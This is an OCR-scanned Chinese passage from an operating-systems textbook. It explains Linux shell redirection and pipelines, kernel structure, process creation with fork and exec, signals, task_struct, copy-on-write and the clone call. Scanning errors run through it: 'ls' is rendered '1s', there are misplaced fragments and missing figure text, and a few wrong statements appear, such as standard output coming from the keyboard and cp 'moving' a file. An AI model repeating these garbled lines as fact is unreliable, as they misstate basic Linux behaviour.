当它(或者任何其他程序) 启动时，它自动获得了对标准输入(负责正常输入),标准输出(负责正常输出)和标准错误(负责输 出错误信息)文件进行访问的能力。
正常情况下，上述三个文件默认地都指向终端，因此标准的输出是
从键盘输入的，而标准输出或者标准错误是输出到显示器的。
许多Linux 程序默认从标准输入进行输入 并从标准输出进行输出。
比如
sort
调用sort 程序，其从终端读取数据(直到用户输入Ctrl-D 表示文件结束),根据字母顺序将它们排序，然 后将结果输出到屏幕上。
sort <in>out
使得sort 从文件in中得到输入，并把结果输出到文件out 中。
由于标准错误没有被重定向，因此所有的错 误信息会输出到屏幕中。
一个从标准输入中读取数据，对数据进行某种处理，然后输出到标准输出的程 序称为过滤器 ( filter)。
考虑下面一条包括三条独立命令的命令行：
sort <in >temp;head-30 <temp;rm temp
首先它运行sort, 从 in得到输入然后将结果输出到temp 中。
完成后，shell 运行head, 令其将temp 的前30 行内容输出到标准输出中，默认为终端。
最后，临时文件temp 被删除。
该临时文件不再被回收，而是被 永久性删除。
常常有把命令行中第一个程序的输出作为下一个程序的输入这种情况。
在上面的例子中，我们使用 temp文件来保存这个输出。
然而，Linux提供了一种更简单的方法来达到相同的结果。
在命令行
sort <in |head -30
中，竖杠也常被称为管道符 (pipe symbol),告诉程序从sort 中得到输出并且将其作为输入传给head, 由 此消除了创建、使用和删除一个临时文件的过程。
由管道符连接起来的命令，称为一个管线 (pipeline), 可以包含任意多的命令。
一个由四个部分组成的管线如下所示：
grep ter*.t.|sort |head-20 |tail-5>foo
这里所有以.t 结尾的文件中包含 “ter” 的行被写到标准输出中，然后被排序。
这些内容的前20行被head 选择出来并传给tail, 它又将最后5行(也即排完序的列表中的第16到20行)传给foo。
这个例子显示了 Linux 是如何提供了一组各负责一项任务的基本单元(一些过滤器)和一个几乎可以用无穷的方式把它 们组合起来的机制。
wc-I<a>b &
运行字数统计程序wc, 来统计输入文件a中的行数(-1标志),并将结果输出到b中，不过整个过程都在 后台运行。
命令一被输入，shell 输出提示符就可以接收并处理下一条命令。
管线也可以在后台中运行， 比如下面的指令：
sort <x|head &
多个管线也可以同时在后台中运行。
可以把一系列shell 命令放到一个文件中，然后将此文件作为shell 的输入来运行。
第二个shell 按照顺 序处理这些命令，和处理从键盘输入的命令一样。
包含shell 命令的文件称为shell 脚 本 。
shell 脚本可以给 shell的变量赋值，然后过一段时间再读取这些变量。
shell 脚本也可以包含参数，同时使用if、for 、while 和case 等结构。
因此， 一个shell 脚本实际上是一个由shell 语言编写的程序。
Berkeley C shell是另一种 shell,它的设计目标是使得shell脚本(以及一般意义上的命令语言)在很多方面看上去和C 程序相似。
由于shell 也只是一个用户程序，其他人也设计并发行过很多不同的shell 。
用户可以自由地选择他们喜欢 的任何类型的shell。
10.2.4 Linux应用程序
Linux的命令行 (shell) 用户界面包含大量的标准应用程序。
这些程序可以大致分成以下6类：
1)文件和目录操作命令。
2)过滤器。
3)程序设计工具，如编辑器和编译器。
4)文档处理。
5)系统管理。
6)其他。
标准POSIX 1003.1-2008规定了上述分类中约150个程序的语法和语义，主要是前三类中的程序。
让这些 程序具有统一的标准主要是为了实现让任何人写的shell 脚本可以在任何Linux 系统上运行。
除了这些标准应用程序外，当然还有许多其他应用程序，比如Web浏览器、多媒体播放器、图片浏 览器、办公软件和游戏程序等。
下面我们看一看一些程序的例子，首先从文件和目录操作开始。
cp a b
将文件a移动到b, 而不改变原文件。
相比之下， mv a b
将文件a移动到b但是删除原文件。
从效果上来看，它是文件移动而不是通常意义上的复制。
cat命令可以 把多个文件的内容连接起来，它读入每一个输入文件然后把它们按顺序复制到标准输出中。
可以通过rm 命令来删除文件。
命令chmod 可以让属主通过修改文件的权限位来改变其访问权限。
使用mkdir 和rmdir 命令可以分别实现目录的创建和删除。
为了列出一个目录下的文件，可以使用1s 命令。
它包含大量的标 志来控制要显示文件的哪些特征(如大小、用户、用户组、创建日期)、决定文件的显示顺序(如字母 序、修改日期、逆序)、指定文件输出格式等。
我们已经见到了很多过滤器：grep 从标准输入或者一个或多个输入文件中提取包含特定模式的行； sort 将输入进行排序并输出到标准输出；head 提取输入的前几行；tail 提取输入的后几行。
其他的由 1003.2定义的过滤器有：cut 和paste, 它们实现一段文档的剪切和粘贴；od 将输入(通常是二进制)转换
有这些程序以及许多其他标准的应用程序。
图10-2 POSIX 定义的一些常见的Linux应用程序
10.2.5 内核结构
在图10- 1中我们看到了Linux 系统的总体结构。
在进 一 步研究内核的组成部分，如进程调度和文件 系统之前，我们先从整体的角度看一 下Linux 的内核。
内核坐落在硬件之上，负责实现与I/O设备和存储管理单元的交互，并控制CPU对前述设备的访问。
如图10-3所示，在最底层，内核包含中断处理程序，它们是与设备交互的主要方式，以及底层的分派机 制。
这种分派在中断时发生。
底层的代码中止正在运行的进程，将其状态存储在内核进程结构中，然后 启动相应的驱动程序。
进程分派也在内核完成某些操作，并且需要再次启动一个用户进程时发生。
进程 分派的代码是汇编代码，并且和进程调度代码有很大不同。
图10-3 Linux 内核结构
接下来，我们将内核子系统分为三个主要部件。
在图10-3中I/O 部件包含所有负责与设备交互以及 实现联网和存储的I/O功能的内核部件。
在最高层，这些I/O 功能全部整合在一个虚拟文件系统层中。
也 就是说，从顶层来看，对一个文件进行读操作，不论是在内存还是磁盘中，都和从终端输入中读取一个 字符是一样的。
从底层来看，所有的I/O操作都要通过某一个设备驱动器。
所有的Linux驱动程序都可以 被分类为字符驱动程序或块驱动程序，两者之间的主要区别是块设备允许查找和随机访问而字符设备不 允许。
从技术上讲，网络设备实际上是字符设备，不过它们的处理和其他字符设备不太一样，因此为了 清晰起见将它们单独分类，如图10-3所示。
在设备驱动程序之上，每个设备类型的内核代码都不一样。
字符设备有两种不同的使用方式。
有些 程序，如可视编辑器vi,emacs 等，需要每一个键盘输入。
原始的终端 (tty)I/O 可以实现这种功能。
其 他程序，比如shell等，是面向行的，因此允许用户在输入回车并将字符串发送给程序之前整行地进行编 辑。
在这种情况下，由终端流出的字符流需要通过一个所谓的行规则，其中的内容被相应地格式化。
网络软件通常是模块化的，由不同的设备和协议来支持。
网络设备的上一个层次负责一种常规程序， 确保每一个包被送到正确的设备或协议处理器。
大多数Linux 系统在内核中包含一个完整的硬件路由器 的功能，尽管其性能比硬件路由器的性能差一些。
在路由器代码之上的是实际的协议栈，它总是包含IP 和TCP协议，也包含一些其他协议。
在整个网络之上的是socket 接口，它允许程序来为特定的网络和协 议创建socket, 并为每一个socket 返回一个待用的文件描述符。
在磁盘驱动器之上是I/O 调度器，它负责排序和分配磁盘读写操作，以尽可能减少磁头的无用移动 或者满足一些其他的系统原则为方法。
块设备列的最顶层是文件系统。
Linux 中可能有多个文件系统同时存在。
为了向文件系统的实现隐藏 不同硬件设备体系之间的区别， 一个通用的块设备层提供了一个可以被所有文件系统使用的抽象。
图10-3的右边是Linux内核的另外两个重要组成部件，它们负责存储和进程管理任务。
存储管理任 务包括维护虚拟内存到物理内存的映射，维护最近被访问页面的缓存以及实现一个好的页面置换算法， 并且根据需要把需要的数据和代码页读入内存中。
进程管理部件的最主要任务是进程的创建和终止。
它还包括一个进程调度器，负责选择下一步运行 哪个进程或线程。
我们将在下一节看到，Linux 把进程和线程简单地看作可运行的实体，并使用统一的 调度策略对它们进行调度。
最后，信号处理的代码也属于进程管理部件。
尽管这三个部件在图中被分开，实际上它们高度相互依赖。
文件系统一般通过块设备进行文件访问。
然而，为了隐藏磁盘读取的严重延迟，文件被复制到内存中的页缓存中。
有些文件甚至可能是动态创建 的并且只在内存中存在，比如提供运行时资源使用情况的文件。
另外，当需要清空一些页时，虚拟存储 系统可能依靠一个磁盘分区或者文件内的交换区来备份内存的一部分，因此依赖于I/O 部件。
当然，还 存在着很多其他的组件之间的相互依赖。
除了内核内的静态部件外，Linux 支持动态可装载模块。
这些模块可以用来补充或者替换缺省的设 备驱动程序、文件系统、网络或者其他内核代码。
在图10-3中没有显示这些模块。
最后，处在最顶层的是到内核的系统调用接口。
所有系统调用都来自这里，其触发一个陷入，并将 系统从用户态转换到受保护的内核态，继而将控制权交给上述的内核部件之一。
10.3 Linux中的进程
前面的几个小节是从键盘的角度来看待Linux, 也就是说以用户在xterm 窗口中所见的内容来看待 Linux。
我们给出了常用的shell 命令和标准应用程序作为例子。
最后，以一个对Linux 系统结构的简要概 括作为结尾。
现在，让我们深入到系统内核，更仔细地研究Linux 系统所支持的基本概念，即进程、内 存、文件系统和输入/输出。
这些概念非常重要，因为系统调用(到操作系统的接口)将对这些概念进 行操作。
举个例子来说，Linux 系统中存在着用来创建进程和线程、分配内存、打开文件以及进行输入/ 输出操作的系统调用。
遗憾的是，由于Linux 系统的版本非常之多，各个版本之间均有不同。
在这一章里，我们将摒弃着 眼于某一个Linux 版本的方法，转而强调各个版本的共通之处。
因此，在某些小节中(特别是涉及实现 方法的小节),这里讨论的内容不一定同样适用于每个Linux 版本。
10.3.1 基本概念
Linux 系统中主要的活动实体就是进程。
Linux 进程与我们在第2章所学的经典顺序进程极为相似。
每个进程执行一段独立的程序并且在进程初始化的时候拥有一个独立的控制线程。
换句话说，每一个进 程都拥有一个独立的程序计数器，用这个程序计数器可以追踪下一条将要被执行的指令。
一旦进程开始 运 行 ，Linux 系统将允许它创建额外的线程。
由于Linux 是一个多道程序设计系统，因此系统中可能会有多个彼此之间相互独立的进程在同时运 行。
而且，每一个用户可以同时开启多个进程。
因此，在一个庞大的系统里，可能有成百个甚至上千个 进程在同时运行。
事实上，在大多数单用户的工作站里，即使用户已经退出登录，仍然会有很多后台进 程，即守护进程(daemon), 在运行。
在系统启动的时候，这些守护进程就已经被shell 脚本开启(在英 语 中 ，“daemon” 是 “demon” 的另一种拼写，而demon 是指恶魔)。
计划任务 (cron daemon)是一个典型的守护进程。
它每分钟运行一次来检查是否有工作需要它完 成。
如果有工作要做，它就会将之完成，然后进入休眠状态，直到下一次检查时刻来到。
计划任务也可以执行一些周期性的活动，比如说在每天凌晨四点的时候进行磁盘备份，或者是提醒 健忘的用户每年10月31号的时候需要为万圣节储备一些好吃的糖果。
当然，系统中还存在其他的守护进 程，他们接收或发送电子邮件、管理打印队列、检测内存中是否有足够的空闲页等。
在Linux系统中， 守护进程可以直接实现，因为它不过是与其他进程无关的另一个独立的进程而已。
在Linux系统中，进程通过非常简单的方式创建。
系统调用fork 将会创建一个与原始进程完全相同 的进程副本。
调用fork 函数的进程称为父进程，新的进程称为子进程。
父进程和子进程都拥有自己的私 有内存映像。
如果在调用fork 函数之后，父进程修改了属于它的一些变量，这些变化对于子进程来说是 不可见的，反之亦然。
但是，父进程和子进程可以共享已经打开的文件。
也就是说，如果某一个文件在父进程调用fork 函 数之前就已经打开了，那么在父进程调用fork 函数之后，对于父进程和子进程来说，这个文件也是打开 的。
如果父、子进程中任何一个进程对这个文件进行了修改，那么对于另一个进程而言，这些修改都是 可见的。
这是唯一合理的做法，因为该文件的修改对其他无关进程也是可见的。
事实上，父、子进程的内存映像、变量、寄存器以及其他所有的东西都是相同的，这就产生了一 个问题：该如何区别这两个进程，即哪一个进程该去执行父进程的代码，哪一个进程该去执行子进程
的代码呢?
秘密在于fork系统调用给 子进程返回一个零值，而给父进程返 回一个非零值。
这个非零值是子进程 的进程标识符 (Process Identifier, PID) 。
两个进程检验fork 函数的返回 值，并且根据返回值继续执行，如图 10-4所示。
进程以其PID来命名。
如前所述， 当一个进程被创建的时候，它的父进
图10-4 Linux中的进程创建
程会得到它的PID。
如果子进程希望知道它自己的PID, 可以调用系统调用getpid 。
PID 有很多用处，举 个例子来说，当一个子进程结束的时候，它的父进程会得到该子进程的PID。
这一点非常重要，因为一 个父进程可能会有多个子进程。
由于子进程还可以生成子进程，那么一个原始进程可以生成一个进程树， 其中包含着子进程、孙子进程以及关系更疏远的后裔进程。
Linux系统中的进程可以通过一种消息传递的方式进行通信。
在两个进程之间，可以建立一个通道， 一个进程向这个通道里写入字节流，另一个进程从这个通道中读取字节流。
这些通道称为管道 (pipe) 。
管道是同步的，因为如果一个进程试图从一个空的管道中读取数据，这个进程就会被挂起直到管道中有 可用的数据为止。
shell中的管线就是用管道技术实现的。
当shell 看到类似下面的一行输入时：
sort <f|head
它会创建两个进程，分别是sort和head,同时在两个进程间建立一个管道使得sort进程的标准输出作为 head 进程的标准输入。
这样一来，sort 进程产生的输出可以直接作为head 进程的输入而不必写入到一个 文件当中去。
如果管道满了，系统会停止运行sort 进程直到head进程从管道中取出一些数据。
除了管道这种方式，进程还可以通 过另一种方式通信：软中断。
一个进程可 以给另一个进程发送信号 (signal) 。
进程 可以告诉操作系统当信号到来时它们希望 发生什么事件。
相关的选择有忽略这个信 号、抓取这个信号或者被信号杀死，终止 进程是处理信号的默认操作。
如果一个进 程希望获取所有发送给它的信号，它就必 须指定一个信号处理函数。
当信号到达时， 控制立即切换到信号处理函数。
当信号处 理函数结束并返回之后，控制像硬件I/O 中断一样返回到陷入点处。
一个进程只可 以给它所在进程组中的其他进程发送信 号，这个进程组包括它的父进程(以及远
图10-5 POSIX 定义的信号
祖进程)、兄弟进程和子进程(以及后裔进程)。
同时， 一个进程可以利用系统调用给它所在的进程组中 所有的成员发送信号。
10.3.2 Linux中进程管理相关的系统调用
现在来关注一下Linux 系统中与进程管理相关的系统调用。
主要的系统调用如图10-6所示。
为了开 始我们的讨论，fork 函数是一个很好的切入点。
fork 系统调用是Linux 系统中创建一个新进程的主要方式， 同时也被其他传统的UNIX系统所支持(在下一部分将讨论另一种创建进程的方法)。
fork 函数创建一个 与原始进程完全相同的进程副本，包括相同的文件描述符、相同的寄存器内容和其他的所有东西。
fork 函数调用之后，原始进程和它的副本(即父进程和子进程)各循其路。
虽然在fork 函数刚刚结束调用的 时候，父、子进程所拥有的全部变量都具有相同的变量值，但是由于父进程的全部地址空间已经被子进 程完全复制，父、子进程中的任何一个对内存的后续操作所引起的变化将不会影响另外一个进程。
fork 函数的返回值，对于子进程来说，恒为0;对于父进程来说，是它所生成的子进程的PID。
利用返回的 PID, 可以区分哪一个进程是父进程，哪一个进程是子进程。
在大多数情况下，调用fork 函数之后，子进程需要执行不同于父进程的代码。
以shell 为例。
它从终 端读取一行命令，调用fork 函数生成一个子进程，然后等待子进程来执行这个命令，子进程结束之后继 续读取下一条命令。
在等待子进程结束的过程中，父进程调用系统调用waitpid, 一直等待直到子进程结 束运行(如果该父进程不止拥有一个子进程，那么要一直等待直到所有的子进程全部结束运行)。
waitpid 系统调用有三个参数。
设置第一个参数可以使调用者等待某一个特定的子进程。
如果第一个参数 为-1,任何一个子进程结束系统调用waitpid 即可返回(比如说，第一个子进程)。
第二个参数是一个用 来存储子进程退出状态(正常退出、异常退出和退出值)的变量地址，这个参数可以让父进程知道子进 程所处的状态。
第三个参数决定了如果没有子进程结束运行的话，调用者是阻塞还是返回。
仍然以shell为例，子进程必须执行用户键入的命令。
子进程通过调用系统调用exec 来执行用户命令， 以exec 函数的第一个参数命名的文件将会替换掉子进程原来的全部核心映像。
图10-7展示了一个高度简 化的shell (有助于理解系统调用fork 、waitpid 和exec 的用法)。
图10-6 一些与进程相关的系统调用。
如果发生错误，则返回值s 是 - 1 ,pid 指进程ID,residual 指前一个警 报的剩余时间。
参数的含义由其名字指出
在大多数情况下，exec 函数有三个参数：待执行文件的文件名，指向参数数组的指针和指向环境 数组的指针。
简单介绍一下其他的类似函数。
很多库函数，如execl 、execv 、execle 和execve, 允许省略 参数或者用不同的方式来指定参数。
上述的所有库函数都会调用相同的底层系统调用。
尽管系统调用是
exec 函数，但是函数库中却没有同名的库函数，所以只能使用上面提到的其他函数。
考虑在shell 中输入如下命令：
cp file1 file2
用来建立一个名为file2的 file1的副本。
在shell调 用fork函数之后，子进程定位并执行文件名为cp的可执 行文件同时把需要复制的文件信息传递给它。
cp的主程序(还有很多其他的程序)包含一个函数声明：
main(argc,argv,envp)
在这里，参数argc 表示命令行中包括程序名的项的数目。
在上面所举的例子中，argc 的值为3。
第二个参数argv 是一个指向数组的指针。
数组的第i项是一个指向命令行中第i 个字符串的指针。
在 此例中，argv[0] 指向字符串“cp” 。
以 此 类 推 ，argv[1] 指向五字节长度的字符串 “file1”,argv[2] 指向五 字节长度的字符串 “file2”。
main的第三个参数envp 是一个指向环境的指针，这里的环境，是指一个包含若干个形如name = value赋值语句的字符串数组，这个数组将传递终端类型、主目录名等信息给程序。
在图10-7中，没有要 传给子进程的环境列表，所以在这里，execve 函数的第三个参数是0。
图10-7一个高度简化的shell
如果exec 函数看起来太复杂了，不要泄气，这已经是最复杂的系统调用了，剩下的要简单很多。
作为一个简单的例子，我们来考虑exit函数，进程在结束运行时会调用这个函数。
它有一个参数，即退 出状态(从0到255),这个参数的值最后会传递给父进程调用waitpid函数的第二个参数——状态参数。
状态参数的低字节部分包含着结束状态，0意味着正常结束，其他的值代表各种不同的错误。
状态参数 的高字节部分包含着子进程的退出状态(从0到255),其值由子进程调用的exit 系统调用指定。
例如，如 果父进程执行如下语句：
n=waitpid(-1,&status,O);
它将一直处于挂起状态，直到有子进程结束运行。
如果子进程退出时以4作为exit 函数的参数，父进程将 会被唤醒，同时将变量n设置为子进程的PID, 变量status 设置为0x0400 ( 在C 语言中，以0x作为前缀表 示十六进制)。
变量status 的低字节与信号有关，高字节是子进程返回时调用exit 函数的参数值。
如果一个进程退出但是它的父进程并没有在等待它，这个进程进入僵死状态 (zombie state)。
最 后 当父进程等待它时，这个进程才会结束。
一些与信号相关的系统调用以各种各样的方式被运用。
比方说，如果一个用户偶然间命令文字编辑 器显示一篇超长文档的全部内容，然后意识到这是一个误操作，这就需要采用某些方法来打断文字编辑 器的工作。
对于用户来说，最常用的选择是敲击某些特定的键(如DEL或者CTRL-C 等),从而给文字编 辑器发送一个信号。
文字编辑器捕捉到这个信号，然后停止显示。
为了表明所关心的信号有哪些，进程可以调用系统调用sigaction。
这个函数的第一个参数是希望捕 捉的信号(如图10-5所示)。
第二个参数是一个指向结构的指针，在这个结构中包括一个指向信号处理
函数的指针以及一些其他的位和标志。
第三个参数也是一个指向结构的指针，这个结构接收系统返回的 当前正在进行的信号处理的相关信息，有可能以后这些信息需要恢复。
信号处理函数可以运行任意长的时间。
尽管如此，在实践当中，通常情况下信号处理函数都非常短 小精悍。
当信号处理完毕之后，控制返回到断点处继续执行。
sigaction 系统调用也可以用来忽略一个信号，或者恢复为一个杀死进程的缺省操作。
敲击DEL 键并不是发送信号的唯一方式。
系统调用kill允许一个进程给它相关的进程发送信号。
选 择“kill”作为这个系统调用的名字其实并不是十分贴切，因为大多数进程发送信号给别的进程只是为 了信号能够被捕捉到。
然而，如果一个信号没有被接收者捕获，那么接收者将被该信号杀死。
对于很多实时应用程序，在一段特定的时间间隔之后，一个进程必须被打断，系统会转去做一些其 他的事情，比如说在一个不可信的信道上重新发送一个可能丢失的数据包。
为了处理这种情况，系统提 供了alarm系统调用。
这个系统调用的参数规定了一个以秒为单位的时间间隔，这个时间间隔过后，一个 名为SIGALRM的信号会被发送给进程。
一个进程在某一个特定的时刻只能有唯一一个未处理的警报。
如 果alarm 系统调用首先以10秒为参数被调用，3秒钟之后，又以20秒为参数被调用，那么只会生成一个 SIGALRM 信号，这个信号生成在第二次调用alarm系统调用的20秒之后。
第一次alarm系统调用设置的信 号被第二次alarm系统调用取消了。
如果alarm系统调用的参数为0,任何即将发生的警报信号都会被取消。
如果没有捕捉到警报信号，将会采取默认的处理方式，收取信号的进程将会被杀死。
从技术角度来讲， 警报信号是可以忽略的，但是这样做毫无意义。
为什么要求信号提醒的程序后来却忽略该信号呢?
10.3.3 Linux中进程与线程的实现
Linux 系统中的一个进程就像是一座冰山：你所看见的不过是它露出水面的部分，而很重要的一部 分隐藏在水下。
每一个进程都有一个运行用户程序的用户模式。
但是当它的某一个线程调用系统调用之 后，进程会陷入内核模式并且运行在内核上下文中，它将使用不同的内存映射并且拥有对所有机器资源 的访问权。
它还是同一个线程，但是现在拥有更高的权限，同时拥有自己的内核堆栈以及内核程序计数 器。
这几点非常重要，因为一个系统调用可能会因为某些原因陷入阻塞态，比如说，等待一个磁盘操作 的完成。
这时程序计数器和寄存器内容会被保存下来使得不久之后线程可以在内核模式下继续运行。
在Linux系统内核中，进程通过数据结构task_struct 被表示成任务 (task) 。
不像其他的操作系统会区 别进程、轻量级进程和线程，Linux 系统用任务的数据结构来表示所有的执行上下文。
所以， 一个单线 程的进程只有一个任务数据结构，而一个多线程的进程将为每一个用户级线程分配一个任务数据结构。
最 后 ，Linux 的内核是多线程的，并且它所拥有的是与任何用户进程无关的内核级线程，这些内核级线 程执行内核代码。
稍后，本节会重新关注多线程进程(一般来讲就是线程)的处理方式。
对于每一个进程，一个类型为task_struct 的进程描述符是始终存在于内存当中的。
它包含了内核管 理全部进程所需的重要信息，如调度参数、已打开的文件描述符列表等。
进程描述符从进程被创建开始 就一直存在于内核堆栈之中。
为了与其他UNIX系统兼容，Linux 还通过进程标识符 (PID) 来区分进程。
内核将所有进程的任务 数据结构组织成一个双向链表。
不需要遍历这个链表来访问进程描述符，PID 可以直接被映射成进程的 任务数据结构所在的地址，从而立即访问进程的信息。
任务数据结构包含非常多的分量。
其中一些分量包含指向其他数据结构或段的指针，比如说包含关 于已打开文件的信息。
有些段只与进程用户级的数据结构有关，当用户进程没有运行的时候，它们是不 被关注的。
所以，当不需要它们的时候，这些段可以被交换出去或重新分页以达到不浪费内存的目的。
举个例子，尽管对于一个进程来说，当它被交换出去的时候，可能会有其他进程给它发送信号，但是这 个进程本身却不会要求读取一个文件。
正因为如此，关于信号的信息才必须永远保存在内存里，即使这 个进程已经不在内存当中了。
另一方面，关于文件描述符的信息可以被保存在用户级的数据结构里，当
进程存在于内存当中并且可以执行的时候，这些信息才需要被调入内存。
进程描述符的信息可以大致归纳为以下几大类：
1)调度参数。
进程优先级，最近消耗的CPU时间，最近睡眠的时间。
上面几项内容结合在一起决定 了下一个要运行的进程是哪一个。
2)内存映射。
指向代码、数据、堆栈段或页表的指针。
如果代码段是共享的，代码指针指向共享代 码表。
当进程不在内存当中时，关于如何在磁盘上找到这些数据的信息也被保存在这里。
3)信号。
掩码显示了哪些信号被忽略、哪些信号需要被捕捉、哪些信号被暂时阻塞以及哪些信号在 传递当中。
4)机器寄存器。
当内核陷阱发生时，机器寄存器的内容(也包括被使用了的浮点寄存器的内容)会 被保存。
5)系统调用状态。
关于当前系统调用的信息，包括参数和返回值。
6)文件描述符表。
当一个与文件描述符有关的系统调用被调用的时候，文件描述符作为索引在文件 描述符表中定位相关文件的i 节点数据结构。
7) 统计数据。
指向记录用户、进程占用系统CPU时间的表的指针。
一些系统还保存一个进程最多可 以占用CPU的时间、进程可以拥有的最大堆栈空间、进程可以消耗的页面数等。
8) 内核堆栈。
进程的内核部分可以使用的固定堆栈。
9) 其 他 。
当前进程状态。
如果有的话，包括正在等待的事件、距离警报时钟超时的时间、 PID 、父 进程的PID以及其他用户标识符、组标识符等。
记住这些信息，现在可以很容易地解释在Linux 系统中是如何创建进程的。
实际上，创建一个新进 程的机制非常简单。
为子进程创建一个新的进程描述符和用户空间，然后从父进程复制大量的内容。
这 个子进程被赋予一个PID, 并建立它的内存映射，同时它也被赋予了访问属于父进程文件的权限。
然后， 它的寄存器内容被初始化并准备运行。
当系统调用fork执行的时候，调用fork函数的进程陷入内核并且创建一个任务数据结构和其他相关 的数据结构，如内核堆栈和thread_info 结构。
这个结构位于进程堆栈栈底固定偏移量的地方，包含一些 进程参数，以及进程描述符的地址。
把进程描述符的地址存储在一个固定的地方，使得Linux 系统只需 要进行很少的有效操作就可以定位到一个运行中进程的任务数据结构。
进程描述符的主要内容根据父进程的进程描述符的值来填充。
Linux 系统寻找一个可用的PID, 且该 PID此刻未被任何进程使用。
更新进程标识符散列表的表项使之指向新的任务数据结构即可。
以防散列 表发生冲突，相同键值的进程描述符会被组成链表。
它会把task_struct 结构中的一些分量设置为指向任 务数组中相应进程的前一/后一进程的指针。
理论上，现在就应该为子进程的数据段、堆栈段分配内存，并且对父进程的段进行复制，因为fork 函数意味着父、子进程之间不共享内存。
其中如果代码段是只读的，可以复制也可以共享。
然后，子进 程就可以运行了。
但是，复制内存的代价相当昂贵，所以现代Linux 系统都使用了“欺骗”的手段来代替。
它们赋予 子进程属于它的页表，但是这些页表都指向父进程的页面，同时把这些页面标记成只读。
当进程(可以 是子进程或父进程)试图向某一页面中写入数据的时候，它会收到写保护的错误。
内核发现进程的写入 行为之后，会为进程分配一个该页面的新副本，并将这个副本标记为可读、可写。
通过这种方式，使得 只有需要写入数据的页面才会被复制。
这种机制叫作写时复制。
它所带来的额外好处是，不需要在内存 中维护同一个程序的两个副本，从而节省了RAM。
子进程开始运行之后，运行代码(本章以shell的副本作为例子)调用系统调用exec, 将命令名作为 exec 函数的参数。
内核找到并验证相应的可执行文件，把参数和环境变量复制到内核，释放旧的地址空 间和页表。
东西，所以程序可以快速地开始运行，只有在所需页面不在内存中时才会发生页面错误(这种情况是第 3章中讨论的最纯粹的按需分页机制)。
最后，参数和环境变量被复制到新的堆栈中，信号被重置，寄存 器被全部清零。
从这里开始，新的命令就可以运行了。
图10-8通过下面的例子解释了上述的步骤：某用户在终端键入一个命令Is,shell 调用fork 函数复制 自身以创建一个新进程。
新的shell进程调用exec 函数用可执行文件1s的内容覆盖它的内存。
完成后，Is 开始运行。
分配子进程任务数据结构
从父进程处得到数据填写子进程任务数据结构 分配子进程堆栈和用户空间
从父进程处得到数据填写子进程用户空间
为子进程分配PID
设置子进程以共享父进程的正文
为数据和堆栈复制页表
设置共享打开文件
为子进程复制父进程的寄存器
寻找可执行程序
验证执行许可
读取和验证头文件
给内核复制变量、环境参数 释放旧的地址空间
分配新的地址空间
为堆栈复制变量、环境参数 信号复位
初始化寄存器
图10-8 shell 执行命令1s的步骤
Linux中的线程
我们在第2章中概括性地介绍了线程。
在这里，我们重点关注Linux 系统的内核线程，特别是Linux 系统中线程模型与其他UNIX 系统的不同之处。
为了能更好地理解Linux 模型所提供的独一无二的性能， 我们先来讨论一些多线程操作系统中存在的有争议的决策。
引入线程的最大争议在于维护传统UNIX语义的正确性。
首先来考虑fork函数。
假设一个多(内核) 线程的进程调用了fork 系统调用。
所有其他的线程都应该在新进程中被创建吗?
我们暂时认为答案是肯 定的。
再假设其他线程中的其中一个线程在从键盘读取数据时被阻塞。
那么,新进程中对应的线程也应 该被阻塞么?
如果是的话，那么哪一个线程应该获得下一行的输入?
如果不是的话，新进程中对应的线 程又应该做什么呢?
同样的问题还大量存在于线程可以完成的很多其他的事情上。
在单线程进程中，由 于调用fork函数的时候，唯一的进程是不可能被阻塞的，所以不存在这样的问题。
现在，考虑这样的情 况——其他的线程不会在子进程中被创建。
再假设一个没有在子进程中被创建的线程持有一个互斥变量， 而子进程中唯一的线程在fork 函数结束之后要获得这个互斥变量。
那么由于这个互斥变量永远不会被释 放，所以子进程中唯一的线程也会永远挂起。
还有大量其他的问题存在。
但是没有简单的解决办法。
文件输入/输出是另一个问题。
假设一个线程由于要读取文件而被阻塞，而另一个线程关闭了这个 文件，或者调用lseek 函数改变了当前的文件指针。
下面会发生什么事情呢?
谁能知道?
信号的处理是另一个棘手的问题。
信号是应该发送给某一个特定的线程还是发送给线程所在的进程 呢?
一个浮点运算异常信号SIGFPE 应该被引起浮点运算异常的线程所捕获。
但是如果它没有捕获到 呢?
是应该只杀死这个线程，还是杀死线程所属进程中的全部线程?
再来考虑由用户通过键盘输入的信 号SIGINT 。
哪一个线程应该捕获这个信号?
所有的线程应该共享同样的信号掩码吗?
通常，解决这些 或其他问题的所有方法会引发另一些问题。
使线程的语义正确(不涉及代码)不是一件容易的事。
Linux系统用一种非常值得关注的有趣的方式支持内核线程。
具体实现基于4.4BSD 的思想，但是在
那个版本中内核线程没能实现，因为在能够解决上述问题的C语言程序库被重新编写之前，Berkeley 就 资金短缺了。
从历史观点上说，进程是资源容器，而线程是执行单元。
一个进程包含一个或多个线程，线程之间共享 地址空间、已打开的文件、信号处理函数、警报信号和其他。
像上面描述的一样，所有的事情简单而清晰。
2000年的时候，Linux 系统引入了一个新的、强大的系统调用clone, 模糊了进程和线程的区别，甚 至使得两个概念的重要性被倒置。
任何其他UNIX系统的版本中都没有clone 函数。
传统观念上，当一个 新线程被创建的时候，之前的线程和新线程共享除了寄存器内容之外的所有信息。
特别是，已打开文件 的文件描述符、信号处理函数、定时器信号和其他每个进程(不是每个线程)都具有的全局属性。
clone 函数可以设置这些属性是进程特有的还是线程特有的。
它的调用方式如下：
pid =clone(function,stack_ptr,sharing_flags,arg);
调用这个函数可以在当前进程或新的进程中创建一个新线程，具体依赖于参数sharing_flags。
如果新线程在当 前进程中，它将与其他已存在的线程共享地址空间，任何一个线程对地址空间做出修改对于同一进程中的其 他线程而言都是立即可见的。
另外一种情况，如果地址空间不是共享的，新线程会获得地址空间的完整副本， 但是新线程对这个副本进行的修改对于旧的线程来说是不可见的。
这些语义同POSIX的fork函数是相同的。
在这两种情况下，新线程都从function 处开始执行，并以arg 作为唯一的参数。
同时，新线程还拥有 私有堆栈，其中私有堆栈的指针被初始化为stack_ptr。
图10-9 sharing-flags位图中的各个位
CLONE_FS 位控制着是否共享根目录、当前工作目录和umask标志。
即使新线程拥有自己的地址空 间，如果该位置1,新、旧线程之间也可以共享当前工作目录。
这就意味着即使一个线程拥有自己的地 址空间，另一个线程也可以调用chdir 函数改变它的工作目录。
在UNIX 系统中，一个线程通常会调用 chdir函数改变它所在进程中其他线程的当前工作目录，而不会对另一进程中的线程做这样的操作。
所以 说，这一位引入了一种传统UNIX系统不可能具有的共享性。
CLONE_FILES 位与CLONE_FS 位相似。
如果该位置1,新线程与旧线程共享文件描述符，所以一 个线程调用Iseek函数对另一个线程而言是可见的。
通常，这样的处理是对于同属一个进程的线程，而 不是不同进程的线程。
